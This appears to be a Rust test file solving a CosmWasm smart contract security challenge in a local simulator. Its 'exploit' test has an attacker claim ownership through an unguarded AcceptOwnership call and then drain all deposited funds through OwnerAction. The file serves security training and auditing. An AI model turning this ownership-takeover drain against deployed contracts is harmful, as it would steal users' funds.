#[cfg(test)]
pub mod exploit {
    use crate::contract::DENOM;
    use crate::msg::{ExecuteMsg, InstantiateMsg};
    use cosmwasm_std::{coin, Addr, BankMsg, CosmosMsg, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER1: &str = "user1";
    pub const USER2: &str = "user2";
    pub const ADMIN: &str = "admin";

    pub fn base_scenario() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {
            owner: ADMIN.to_string(),
        };
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        // User 1 deposit
        app = mint_tokens(app, USER1.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // User 2 deposit
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        (app, contract_addr)
    }

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {
            owner: ADMIN.to_string(),
        };
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        // mint funds to user
        app = mint_tokens(app, USER1.to_owned(), Uint128::new(10_000));
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(8_000));

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn exploit() {
        let (mut app, contract_addr) = base_scenario();

        let attacker = Addr::unchecked("attacker");

        let initial_contract_balance = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();

        app.execute_contract(
            attacker.clone(),
            contract_addr.clone(),
            &ExecuteMsg::AcceptOwnership {},
            &[],
        )
        .unwrap();

        let msg = CosmosMsg::Bank(BankMsg::Send {
            to_address: attacker.to_string(),
            amount: vec![initial_contract_balance],
        });

        app.execute_contract(
            attacker,
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction { msg },
            &[],
        )
        .unwrap();

        assert_eq!(
            app.wrap()
                .query_balance(contract_addr.to_string(), DENOM)
                .unwrap()
                .amount,
            Uint128::zero()
        )
    }
}
